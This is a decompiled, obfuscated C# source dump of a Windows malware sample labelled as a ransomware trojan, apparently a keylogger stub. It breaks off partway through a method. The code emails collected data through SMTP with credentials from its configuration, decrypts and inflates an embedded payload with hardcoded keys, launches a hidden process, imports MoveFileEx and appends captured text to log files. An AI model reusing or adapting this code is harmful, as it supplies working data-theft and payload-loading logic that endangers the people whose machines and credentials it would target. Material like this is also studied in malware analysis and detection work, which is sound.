// Decompiled with JetBrains decompiler
// Type: .
// Assembly: Microsoft, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 812CF5F4-80B3-4F9B-A390-E995C930E6CD
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\HEUR-Trojan-Ransom.Win32.Generic-1f1acdf902ef68a02ea937e0ad033eb0cbf7b87bf124bfc1e2a141153c50cf4d.exe

using \u0001;
using \u0004;
using \u0006;
using \u0007;
using Accuracy_Logger_Stub.My;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using SmartAssembly.MemoryManagement;
using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Windows.Forms;

namespace \u0006
{
  internal sealed class \u000F
  {
    [NonSerialized]
    internal static \u0007.\u0002 \u009B;

    static void \u0001([In] string obj0, [In] \u0003 obj1, [In] string obj2)
    {
      try
      {
        MailMessage mailMessage = new MailMessage();
        \u0005\u0002.\u007E\u0010\u0003((object) mailMessage, new MailAddress(obj1.\u0001[1]));
        \u0013.\u007E\u009E((object) \u0006\u0002.\u007E\u0011\u0003((object) mailMessage), obj1.\u0001[1]);
        SmtpClient smtpClient;
        if (true)
        {
          \u0013.\u007E\u009F((object) mailMessage, obj2);
          \u0013.\u007E\u0001\u0002((object) mailMessage, obj0);
          smtpClient = new SmtpClient(obj1.\u0001[3]);
          \u0015.\u007E\u000F\u0002((object) smtpClient, \u0091.\u0096\u0002(obj1.\u0001[4]));
          \u0007\u0002.\u007E\u0012\u0003((object) smtpClient, (ICredentialsByHost) new NetworkCredential(obj1.\u0001[1], obj1.\u0001[2]));
        }
        \u0011.\u007E\u0097((object) smtpClient, true);
        \u0008\u0002.\u007E\u0013\u0003((object) smtpClient, mailMessage);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
    }

    static int \u0001([In] \u0005.\u0002 obj0, [In] int obj1)
    {
      while (obj0.\u0003 < obj1)
      {
        if (obj0.\u0001 == obj0.\u0002)
        {
          if (true)
          {
            if (true)
              return -1;
          }
          else
            break;
        }
        else if (true)
        {
          \u0005.\u0002 obj2 = obj0;
          int num1 = (int) obj2.\u0001;
          byte[] numArray1 = obj0.\u0001;
          \u0005.\u0002 obj3 = obj0;
          int num2;
          int num3 = num2 = obj3.\u0001;
          obj3.\u0001 = num2 + 1;
          int index1 = num3;
          int num4 = (int) numArray1[index1] & (int) byte.MaxValue;
          byte[] numArray2 = obj0.\u0001;
          \u0005.\u0002 obj4 = obj0;
          int num5;
          int num6 = num5 = obj4.\u0001;
          obj4.\u0001 = num5 + 1;
          int index2 = num6;
          int num7 = ((int) numArray2[index2] & (int) byte.MaxValue) << 8;
          int num8 = (num4 | num7) << obj0.\u0003;
          obj2.\u0001 = (uint) (num1 | num8);
        }
        else
          continue;
        obj0.\u0003 += 16;
        break;
      }
      long num9 = (long) obj0.\u0001;
      int num10 = 1;
      int num11 = obj1;
      int num12;
      do
      {
        if (true)
        {
          int num13 = num11 & 31;
          num12 = num10 << num13;
          if (true)
          {
            num11 = 1;
            num10 = num12;
          }
          else
            goto label_15;
        }
      }
      while (num11 == 0);
      int num14 = num10 - num11;
      goto label_13;
label_15:
      num14 = num12;
label_13:
      long num15 = (long) num14;
      return (int) (num9 & num15);
    }

    static unsafe byte[] \u0001([In] byte[] obj0)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(46);
      Assembly callingAssembly = Assembly.GetCallingAssembly();
      if (true)
        goto label_47;
label_7:
      \u0005.\u0007 obj1;
      *(int*) ((IntPtr) voidPtr + 12) = \u000F.\u0001(obj1);
      byte[] numArray1;
      if (true)
      {
        *(int*) ((IntPtr) voidPtr + 16) = \u000F.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 20) = \u000F.\u0001(obj1);
        if (*(int*) ((IntPtr) voidPtr + 16) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 16)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 16));
        }
        if (*(int*) ((IntPtr) voidPtr + 20) > 0)
        {
          byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 20)];
          obj1.Read(buffer, 0, *(int*) ((IntPtr) voidPtr + 20));
        }
        long length = obj1.Length;
        if (true)
        {
          long position = obj1.Position;
          length -= position;
        }
        byte[] buffer1 = new byte[length];
        obj1.Read(buffer1, 0, buffer1.Length);
        \u0005.\u0001 obj2 = new \u0005.\u0001(buffer1);
        numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 12)];
        \u000F.\u0001(0, obj2, numArray1.Length, numArray1);
        goto label_46;
      }
label_23:
      byte[] numArray2 = new byte[8]
      {
        (byte) 143,
        (byte) 21,
        (byte) 158,
        (byte) 36,
        (byte) 249,
        (byte) 133,
        (byte) 162,
        (byte) 48
      };
      \u0003 obj3 = new \u0003();
      byte[] numArray3;
      try
      {
        if (true)
        {
          using (ICryptoTransform cryptoTransform = \u000F.\u0001(numArray3, numArray2, obj3, true))
            numArray1 = \u000F.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
        }
      }
      finally
      {
        while (obj3 != null)
        {
          if (true)
          {
            ((IDisposable) obj3).Dispose();
            break;
          }
        }
      }
label_34:
      if (*(int*) ((IntPtr) voidPtr + 24) == 3)
      {
        byte[] numArray4 = new byte[16]
        {
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1,
          (byte) 1
        };
        byte[] numArray5 = new byte[16]
        {
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2,
          (byte) 2
        };
        using (\u0003 obj4 = new \u0003())
        {
          if (true)
          {
            using (ICryptoTransform cryptoTransform = \u000F.\u0001(true, numArray4, numArray5, obj4))
              numArray1 = \u000F.\u0001(cryptoTransform.TransformFinalBlock(obj0, 4, obj0.Length - 4));
          }
        }
      }
label_46:
      obj1.Close();
      return numArray1;
label_47:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if ((object) callingAssembly != (object) executingAssembly && !\u000F.\u0001(executingAssembly, callingAssembly))
        return (byte[]) null;
      obj1 = new \u0005.\u0007(obj0);
      numArray1 = new byte[0];
      *(int*) voidPtr = \u000F.\u0001(obj1);
      if (*(int*) voidPtr == 67324752)
      {
        *(short*) ((IntPtr) voidPtr + 44) = (short) \u000F.\u0001(obj1);
        *(int*) ((IntPtr) voidPtr + 4) = \u000F.\u0001(obj1);
      }
      else
        goto label_15;
label_4:
      *(int*) ((IntPtr) voidPtr + 8) = \u000F.\u0001(obj1);
      if (*(int*) voidPtr != 67324752 || *(short*) ((IntPtr) voidPtr + 44) != (short) 20 || *(int*) ((IntPtr) voidPtr + 4) != 0 || *(int*) ((IntPtr) voidPtr + 8) != 8)
        throw new FormatException("Wrong Header Signature");
      \u000F.\u0001(obj1);
      \u000F.\u0001(obj1);
      \u000F.\u0001(obj1);
      goto label_7;
label_15:
      *(int*) ((IntPtr) voidPtr + 24) = *(int*) voidPtr >> 24;
      *(int*) voidPtr = *(int*) voidPtr - (*(int*) ((IntPtr) voidPtr + 24) << 24);
      if (*(int*) voidPtr != 8223355)
        throw new FormatException("Unknown Header");
      if (true)
      {
        if (*(int*) ((IntPtr) voidPtr + 24) == 1)
        {
          *(int*) ((IntPtr) voidPtr + 28) = \u000F.\u0001(obj1);
          numArray1 = new byte[*(int*) ((IntPtr) voidPtr + 28)];
          *(int*) ((IntPtr) voidPtr + 32) = 0;
          while (*(int*) ((IntPtr) voidPtr + 32) < *(int*) ((IntPtr) voidPtr + 28))
          {
            *(int*) ((IntPtr) voidPtr + 36) = \u000F.\u0001(obj1);
            *(int*) ((IntPtr) voidPtr + 40) = \u000F.\u0001(obj1);
            byte[] buffer = new byte[*(int*) ((IntPtr) voidPtr + 36)];
            obj1.Read(buffer, 0, buffer.Length);
            \u0005.\u0001 obj5 = new \u0005.\u0001(buffer);
            \u000F.\u0001(*(int*) ((IntPtr) voidPtr + 32), obj5, *(int*) ((IntPtr) voidPtr + 40), numArray1);
            *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) + *(int*) ((IntPtr) voidPtr + 40);
          }
        }
        if (*(int*) ((IntPtr) voidPtr + 24) == 2)
        {
          numArray3 = new byte[8]
          {
            (byte) 222,
            (byte) 136,
            (byte) 124,
            (byte) 78,
            (byte) 26,
            (byte) 0,
            (byte) 102,
            (byte) 39
          };
          goto label_23;
        }
        else
          goto label_34;
      }
      else
        goto label_4;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      IntPtr num1 = __untypedstackalloc(12);
      if (true)
        goto label_24;
label_1:
label_2:
      void* voidPtr;
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_3:
        string str;
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 2;
          if (true)
          {
            str = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(1407));
            goto label_17;
          }
          else
            goto label_7;
        }
        else
          goto label_8;
label_5:
        if (true)
        {
          *(int*) ((IntPtr) voidPtr + 8) = 4;
          \u000F.\u0001(str, \u0003.\u0003);
        }
        else
          goto label_9;
label_7:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        \u000F.\u0001(str, \u0003.\u0005);
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str, \u0003.\u0004);
        goto label_21;
label_9:
        int num2 = *(int*) ((IntPtr) voidPtr + 4);
        int num3 = 1;
        int num4;
        if (num3 != 0)
          num4 = num2 + num3;
        else
          goto label_14;
label_11:
        *(int*) ((IntPtr) voidPtr + 4) = 0;
        switch (num4)
        {
          case 1:
            goto label_2;
          case 2:
            goto label_3;
          case 3:
            goto label_17;
          case 4:
            goto label_5;
          case 5:
            goto label_7;
          case 6:
            goto label_8;
          case 7:
            goto label_21;
          default:
            goto label_20;
        }
label_14:
        switch (num2 > num3 ? *(int*) voidPtr : 1)
        {
          case 1:
            goto label_9;
          default:
            goto label_20;
        }
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        \u000F.\u0001(str, \u0003.\u0002);
        goto label_5;
label_12:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        num4 = *(int*) voidPtr;
        if (true)
        {
          num3 = -2;
          num2 = num4;
          goto label_14;
        }
        else
          goto label_11;
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_12;
      }
label_20:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_21:
      do
        ;
      while (false);
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
      return;
label_24:
      voidPtr = (void*) num1;
      goto label_1;
    }

    static unsafe void \u0001()
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(12);
label_1:
      try
      {
        \u0088.\u0089\u0002();
        *(int*) voidPtr = -2;
label_17:
        *(int*) ((IntPtr) voidPtr + 8) = 2;
        string str1 = \u009D.\u0003\u0003(Environment.SpecialFolder.Personal);
        goto label_18;
label_2:
        *(int*) ((IntPtr) voidPtr + 8) = 4;
        string str2 = \u001F.\u001A\u0002(\u0003.\u0006, \u000F.\u009B(1490));
label_3:
        *(int*) ((IntPtr) voidPtr + 8) = 5;
        string str3;
        \u000F.\u0001(str3, \u0003.\u0002);
label_4:
        *(int*) ((IntPtr) voidPtr + 8) = 6;
        \u000F.\u0001(str3, \u0003.\u0003);
label_5:
        *(int*) ((IntPtr) voidPtr + 8) = 7;
        \u000F.\u0001(str3, \u0003.\u0004);
label_6:
        *(int*) ((IntPtr) voidPtr + 8) = 8;
        if (true)
          \u000F.\u0001(str3, \u0003.\u0005);
        else
          goto label_11;
label_8:
        *(int*) ((IntPtr) voidPtr + 8) = 9;
        \u000F.\u0001(str2, \u0003.\u0002);
label_9:
        *(int*) ((IntPtr) voidPtr + 8) = 10;
        \u000F.\u0001(str2, \u0003.\u0003);
label_10:
        *(int*) ((IntPtr) voidPtr + 8) = 11;
        \u000F.\u0001(str2, \u0003.\u0004);
label_11:
label_12:
        *(int*) ((IntPtr) voidPtr + 8) = 12;
        \u000F.\u0001(str2, \u0003.\u0005);
label_13:
        if (false)
          goto label_21;
        else
          goto label_22;
label_18:
        *(int*) ((IntPtr) voidPtr + 8) = 3;
        str3 = \u0093.\u007E\u0098\u0002((object) str1, \u000F.\u009B(1440), \u000F.\u009B(1453));
        goto label_2;
label_15:
        *(int*) ((IntPtr) voidPtr + 4) = *(int*) ((IntPtr) voidPtr + 8);
        switch (*(int*) voidPtr > -2 ? *(int*) voidPtr : 1)
        {
          case 1:
            int num = *(int*) ((IntPtr) voidPtr + 4) + 1;
            *(int*) ((IntPtr) voidPtr + 4) = 0;
            switch (num)
            {
              case 1:
                goto label_1;
              case 2:
                goto label_17;
              case 3:
                goto label_18;
              case 4:
                goto label_2;
              case 5:
                goto label_3;
              case 6:
                goto label_4;
              case 7:
                goto label_5;
              case 8:
                goto label_6;
              case 9:
                goto label_8;
              case 10:
                goto label_9;
              case 11:
                goto label_10;
              case 12:
                goto label_12;
              case 13:
                goto label_13;
            }
            break;
        }
      }
      catch (Exception ex) when (ex is Exception & *(int*) voidPtr != 0 & *(int*) ((IntPtr) voidPtr + 4) == 0)
      {
        ProjectData.SetProjectError(ex);
        goto label_15;
      }
label_21:
      throw \u000E\u0002.\u0014\u0003(-2146828237);
label_22:
      if (*(int*) ((IntPtr) voidPtr + 4) == 0)
        return;
      \u0088.\u0089\u0002();
    }

    static bool \u0001([In] Assembly obj0, [In] Assembly obj1)
    {
label_0:
      byte[] publicKey1 = obj0.GetName().GetPublicKey();
      byte[] publicKey2 = obj1.GetName().GetPublicKey();
label_17:
      int num1 = publicKey2 == null ? 1 : 0;
      int num2;
      int num3;
      if (true)
      {
        num3 = publicKey1 == null ? 1 : 0;
        num2 = num1;
      }
      else
        goto label_14;
label_3:
      int index;
      if (num2 != num3)
      {
        int num4 = 0;
        if (num4 == 0)
          return num4 != 0;
        num2 = num4;
      }
      else if (publicKey2 != null)
      {
        index = 0;
        if (false)
          goto label_0;
        else
          goto label_15;
      }
      else
        goto label_16;
label_9:
      num3 = (int) publicKey1[index];
      if (true)
      {
        if (num2 != num3)
          return false;
        if (true)
          num1 = index + 1;
        else
          goto label_17;
      }
      else
        goto label_3;
label_14:
      index = num1;
label_15:
      if (index < publicKey2.Length)
      {
        num2 = (int) publicKey2[index];
        goto label_9;
      }
label_16:
      return true;
    }

    static \u0005.\u0004 \u0001([In] \u0005.\u0005 obj0)
    {
      byte[] destinationArray = new byte[obj0.\u0003];
      Array.Copy((Array) obj0.\u0002, obj0.\u0002, (Array) destinationArray, 0, obj0.\u0003);
      return new \u0005.\u0004(destinationArray);
    }

    static unsafe int \u0001([In] \u0005.\u0004 obj0, [In] \u0005.\u0002 obj1)
    {
      int num1;
      void* voidPtr;
      if (true)
      {
        int num2 = 16;
        int index;
        int num3;
        while (true)
        {
          // ISSUE: untyped stack allocation
          voidPtr = (void*) __untypedstackalloc(num2);
          if ((index = \u000F.\u0001(obj1, 9)) >= 0)
          {
            if ((num1 = (int) obj0.\u0001[index]) >= 0)
            {
              if (true)
              {
                \u000F.\u0001(obj1, num1 & 15);
                num3 = num1;
                if (false)
                  num2 = num3;
                else
                  break;
              }
              else
                goto label_8;
            }
            else
              goto label_5;
          }
          else
            goto label_13;
        }
        return num3 >> 4;
label_5:
        *(int*) voidPtr = -(num1 >> 4);
        *(int*) ((IntPtr) voidPtr + 4) = num1 & 15;
        int num4;
        if ((num4 = \u000F.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 4))) >= 0)
        {
          int num5 = (int) obj0.\u0001[*(int*) voidPtr | num4 >> 9];
          \u000F.\u0001(obj1, num5 & 15);
          return num5 >> 4;
        }
        *(int*) ((IntPtr) voidPtr + 8) = obj1.\u0003;
        index = \u000F.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 8));
        num1 = (int) obj0.\u0001[*(int*) voidPtr | index >> 9];
label_8:
        if (true)
        {
          if ((num1 & 15) > *(int*) ((IntPtr) voidPtr + 8))
            return -1;
          \u000F.\u0001(obj1, num1 & 15);
          if (true)
            return num1 >> 4;
          goto label_14;
        }
        else
          goto label_16;
label_13:
        *(int*) ((IntPtr) voidPtr + 12) = obj1.\u0003;
        index = \u000F.\u0001(obj1, *(int*) ((IntPtr) voidPtr + 12));
label_14:
        num1 = (int) obj0.\u0001[index];
      }
      if (num1 < 0)
        goto label_18;
label_16:
      if ((num1 & 15) <= *(int*) ((IntPtr) voidPtr + 12))
      {
        \u000F.\u0001(obj1, num1 & 15);
        return num1 >> 4;
      }
label_18:
      return -1;
    }

    static int \u0001([In] \u0005.\u0002 obj0) => obj0.\u0003;

    static int \u0001([In] \u0005.\u0003 obj0) => 32768 - obj0.\u0002;

    static MySettings \u0001()
    {
      // ISSUE: variable of a compiler-generated type
      MySettings mySettings = MySettings.Default;
      return mySettings;
    }

    static ICryptoTransform \u0001(
      [In] byte[] obj0,
      [In] byte[] obj1,
      [In] \u0003 obj2,
      [In] bool obj3)
    {
      obj2.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj2.\u0001, new object[1]
      {
        (object) obj0
      });
      obj2.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj2.\u0001, new object[1]
      {
        (object) obj1
      });
      return (ICryptoTransform) obj2.\u0001.GetMethod(obj3 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj2.\u0001, new object[0]);
    }

    static void \u0001()
    {
      if (false)
        ;
      do
      {
        if (true)
        {
          int num = \u0090.\u0094\u0002(\u000F.\u009B(1515), AppWinStyle.MinimizedFocus, false, -1);
          if (false)
            ;
        }
      }
      while (false);
    }

    static ICryptoTransform \u0001(
      [In] bool obj0,
      [In] byte[] obj1,
      [In] byte[] obj2,
      [In] \u0003 obj3)
    {
      obj3.\u0001.GetProperty("Key").GetSetMethod().Invoke(obj3.\u0001, new object[1]
      {
        (object) obj1
      });
      obj3.\u0001.GetProperty("IV").GetSetMethod().Invoke(obj3.\u0001, new object[1]
      {
        (object) obj2
      });
      return (ICryptoTransform) obj3.\u0001.GetMethod(obj0 ? "CreateDecryptor" : "CreateEncryptor", new System.Type[0]).Invoke(obj3.\u0001, new object[0]);
    }

    static void \u0001()
    {
      try
      {
        if (Environment.OSVersion.Platform != PlatformID.Win32NT)
          return;
        MemoryManager.\u0001 = new MemoryManager();
      }
      catch
      {
      }
    }

    [DllImport("kernel32", EntryPoint = "GetModuleFileNameA", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001(int _param0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string _param1, int _param2);

    [DllImport("kernel32", EntryPoint = "MoveFileExW", CharSet = CharSet.Ansi, SetLastError = true)]
    static extern int \u0001([MarshalAs(UnmanagedType.LPTStr), In] string _param0, [MarshalAs(UnmanagedType.LPTStr), In] string _param1, long _param2);

    static unsafe void \u0001([In] string obj0)
    {
      // ISSUE: untyped stack allocation
      IntPtr num = __untypedstackalloc(2);
      if (true)
        goto label_9;
label_1:
      string str1 = \u009D.\u0003\u0003(Environment.SpecialFolder.System);
      string str2 = \u001F.\u001A\u0002(\u0093.\u007E\u0098\u0002((object) str1, \u0010\u0002.\u007E\u0016\u0003((object) str1, \u000F\u0002.\u007E\u0015\u0003((object) str1, \u000F.\u009B(951))), string.Empty), \u000F.\u009B(951));
      \u0003.\u0001.\u0001 = \u001F.\u001A\u0002(\u009D.\u0003\u0003(Environment.SpecialFolder.ProgramFiles), \u000F.\u009B(1584));
      void* voidPtr;
      *(sbyte*) voidPtr = (sbyte) \u008E.\u0092\u0002(\u0003.\u0001.\u0001);
      if (*(sbyte*) voidPtr == (sbyte) 0)
        return;
      *(sbyte*) ((IntPtr) voidPtr + 1) = (sbyte) !\u008E.\u0092\u0002(\u001F.\u001B\u0002(str2, \u0003.\u0001.\u0002));
      if (*(sbyte*) ((IntPtr) voidPtr + 1) != (sbyte) 0)
        \u0013\u0002.\u0019\u0003(\u000F.\u007E\u001C((object) \u0012\u0002.\u007E\u0018\u0003((object) \u0011\u0002.\u0017\u0003())), \u001F.\u001B\u0002(str2, \u0003.\u0001.\u0002));
      StringBuilder stringBuilder1 = new StringBuilder((int) byte.MaxValue);
      \u000F.\u0001(\u001F.\u001B\u0002(str2, \u0003.\u0001.\u0002), stringBuilder1, \u000E.\u007E\u0014((object) stringBuilder1));
      string str3 = \u000F.\u007E\u001D((object) stringBuilder1);
      StringBuilder stringBuilder2 = new StringBuilder((int) byte.MaxValue);
      \u000F.\u0001(obj0, stringBuilder2, \u000E.\u007E\u0014((object) stringBuilder2));
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo();
        string str4 = \u0080.\u001D\u0002(\u000F.\u009B(1609), \u0014\u0002.\u001A\u0003((object) stringBuilder2), \u000F.\u009B(1614), str3);
        \u0013.\u007E\u0002\u0002((object) processStartInfo, \u0003.\u0001.\u0001);
        \u0013.\u007E\u0003\u0002((object) processStartInfo, str4);
        \u0015\u0002.\u007E\u001C\u0003((object) processStartInfo, ProcessWindowStyle.Hidden);
        Process process = \u0016\u0002.\u001D\u0003(processStartInfo);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        \u0088.\u0089\u0002();
      }
      return;
label_9:
      voidPtr = (void*) num;
      goto label_1;
    }

    static void \u0001()
    {
      if (false)
        goto label_2;
label_1:
      bool flag;
      do
      {
        flag = !\u008E.\u0092\u0002(\u001F.\u001A\u0002(\u009D.\u0003\u0003(Environment.SpecialFolder.ApplicationData), \u000F.\u009B(1619)));
      }
      while (false);
      if (!flag)
        return;
label_2:
      if (true)
      {
        try
        {
          do
          {
            \u000F.\u0001(\u000F.\u009B(1636));
          }
          while (false);
        }
        catch (Exception ex)
        {
          ProjectData.SetProjectError(ex);
          do
          {
            \u0088.\u0089\u0002();
          }
          while (false);
        }
      }
      else
        goto label_1;
    }

    static int \u0001([In] \u0005.\u0003 obj0) => obj0.\u0002;

    static unsafe void \u0001([In] byte[] obj0, [In] \u0005.\u0004 obj1)
    {
      // ISSUE: untyped stack allocation
      void* voidPtr = (void*) __untypedstackalloc(68);
      int[] numArray1 = new int[16];
      int[] numArray2 = new int[16];
      *(int*) voidPtr = 0;
      while (*(int*) voidPtr < obj0.Length)
      {
        *(int*) ((IntPtr) voidPtr + 4) = (int) obj0[*(int*) voidPtr];
        if (*(int*) ((IntPtr) voidPtr + 4) > 0)
        {
          int[] numArray3;
          int index;
          int num = (numArray3 = numArray1)[(IntPtr) (index = *(int*) ((IntPtr) voidPtr + 4))] + 1;
          numArray3[index] = num;
        }
        *(int*) voidPtr = *(int*) voidPtr + 1;
      }
      *(int*) ((IntPtr) voidPtr + 8) = 0;
      *(int*) ((IntPtr) voidPtr + 12) = 512;
      *(int*) ((IntPtr) voidPtr + 16) = 1;
      while (*(int*) ((IntPtr) voidPtr + 16) <= 15)
      {
        numArray2[*(int*) ((IntPtr) voidPtr + 16)] = *(int*) ((IntPtr) voidPtr + 8);
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) + (numArray1[*(int*) ((IntPtr) voidPtr + 16)] << 16 - *(int*) ((IntPtr) voidPtr + 16));
        if (*(int*) ((IntPtr) voidPtr + 16) >= 10)
        {
          *(int*) ((IntPtr) voidPtr + 20) = numArray2[*(int*) ((IntPtr) voidPtr + 16)] & 130944;
          *(int*) ((IntPtr) voidPtr + 24) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
          *(int*) ((IntPtr) voidPtr + 12) = *(int*) ((IntPtr) voidPtr + 12) + (*(int*) ((IntPtr) voidPtr + 24) - *(int*) ((IntPtr) voidPtr + 20) >> 16 - *(int*) ((IntPtr) voidPtr + 16));
        }
        *(int*) ((IntPtr) voidPtr + 16) = *(int*) ((IntPtr) voidPtr + 16) + 1;
      }
      obj1.\u0001 = new short[*(int*) ((IntPtr) voidPtr + 12)];
      *(int*) ((IntPtr) voidPtr + 28) = 512;
      *(int*) ((IntPtr) voidPtr + 32) = 15;
      if (true)
        goto label_15;
label_12:
      *(int*) ((IntPtr) voidPtr + 28) = *(int*) ((IntPtr) voidPtr + 28) + (1 << *(int*) ((IntPtr) voidPtr + 32) - 9);
      *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 44) + 128;
label_13:
      if (*(int*) ((IntPtr) voidPtr + 44) < *(int*) ((IntPtr) voidPtr + 36))
      {
        obj1.\u0001[(int) \u000F.\u0001(*(int*) ((IntPtr) voidPtr + 44))] = (short) (-*(int*) ((IntPtr) voidPtr + 28) << 4 | *(int*) ((IntPtr) voidPtr + 32));
        goto label_12;
      }
      else
        *(int*) ((IntPtr) voidPtr + 32) = *(int*) ((IntPtr) voidPtr + 32) - 1;
label_15:
      if (*(int*) ((IntPtr) voidPtr + 32) >= 10)
      {
        *(int*) ((IntPtr) voidPtr + 36) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 8) = *(int*) ((IntPtr) voidPtr + 8) - (numArray1[*(int*) ((IntPtr) voidPtr + 32)] << 16 - *(int*) ((IntPtr) voidPtr + 32));
        *(int*) ((IntPtr) voidPtr + 40) = *(int*) ((IntPtr) voidPtr + 8) & 130944;
        *(int*) ((IntPtr) voidPtr + 44) = *(int*) ((IntPtr) voidPtr + 40);
        goto label_13;
      }
      else
      {
        *(int*) ((IntPtr) voidPtr + 48) = 0;
        while (*(int*) ((IntPtr) voidPtr + 48) < obj0.Length)
        {
          *(int*) ((IntPtr) voidPtr + 52) = (int) obj0[*(int*) ((IntPtr) voidPtr + 48)];
          if (*(int*) ((IntPtr) voidPtr + 52) != 0)
          {
            *(int*) ((IntPtr) voidPtr + 8) = numArray2[*(int*) ((IntPtr) voidPtr + 52)];
            *(int*) ((IntPtr) voidPtr + 56) = (int) \u000F.\u0001(*(int*) ((IntPtr) voidPtr + 8));
            if (*(int*) ((IntPtr) voidPtr + 52) <= 9)
            {
              do
              {
                obj1.\u0001[*(int*) ((IntPtr) voidPtr + 56)] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < 512);
            }
            else
            {
              *(int*) ((IntPtr) voidPtr + 60) = (int) obj1.\u0001[*(int*) ((IntPtr) voidPtr + 56) & 511];
              *(int*) ((IntPtr) voidPtr + 64) = 1 << (*(int*) ((IntPtr) voidPtr + 60) & 15);
              *(int*) ((IntPtr) voidPtr + 60) = -(*(int*) ((IntPtr) voidPtr + 60) >> 4);
              do
              {
                obj1.\u0001[*(int*) ((IntPtr) voidPtr + 60) | *(int*) ((IntPtr) voidPtr + 56) >> 9] = (short) (*(int*) ((IntPtr) voidPtr + 48) << 4 | *(int*) ((IntPtr) voidPtr + 52));
                *(int*) ((IntPtr) voidPtr + 56) = *(int*) ((IntPtr) voidPtr + 56) + (1 << *(int*) ((IntPtr) voidPtr + 52));
              }
              while (*(int*) ((IntPtr) voidPtr + 56) < *(int*) ((IntPtr) voidPtr + 64));
            }
            numArray2[*(int*) ((IntPtr) voidPtr + 52)] = *(int*) ((IntPtr) voidPtr + 8) + (1 << 16 - *(int*) ((IntPtr) voidPtr + 52));
          }
          *(int*) ((IntPtr) voidPtr + 48) = *(int*) ((IntPtr) voidPtr + 48) + 1;
        }
      }
    }

    static void \u0001([In] \u0005.\u0003 obj0, [In] int obj1, [In] int obj2)
    {
      if ((obj0.\u0002 += obj1) > 32768)
        throw new InvalidOperationException();
      int sourceIndex = obj0.\u0001 - obj2 & (int) short.MaxValue;
      int num = 32768 - obj1;
      if (sourceIndex <= num && obj0.\u0001 < num)
      {
        if (obj1 <= obj2)
        {
          Array.Copy((Array) obj0.\u0001, sourceIndex, (Array) obj0.\u0001, obj0.\u0001, obj1);
          obj0.\u0001 += obj1;
        }
        else
        {
          while (obj1-- > 0)
            obj0.\u0001[obj0.\u0001++] = obj0.\u0001[sourceIndex++];
        }
      }
      else
        \u000F.\u0001(obj0, sourceIndex, obj1, obj2);
    }

    [DllImport("kernel32", EntryPoint = "MoveFileEx")]
    static extern bool \u0001(string _param0, string _param1, int _param2);

    static void \u0001([In] \u0003 obj0)
    {
      FileStream fileStream;
      if (true)
        fileStream = new FileStream(\u0080.\u001D\u0002(\u000F.\u007E\u0017((object) obj0.\u0005()), \u000F.\u009B(951), \u000F.\u007E\u0017((object) obj0.\u0004()), \u000F.\u009B(1653)), FileMode.Append);
      StreamWriter streamWriter = new StreamWriter((Stream) fileStream);
      \u0013.\u007E\u0004\u0002((object) streamWriter, \u000F.\u007E\u0017((object) obj0.\u0001()));
      \u0010.\u007E\u008D((object) streamWriter);
      \u0010.\u007E\u008E((object) fileStream);
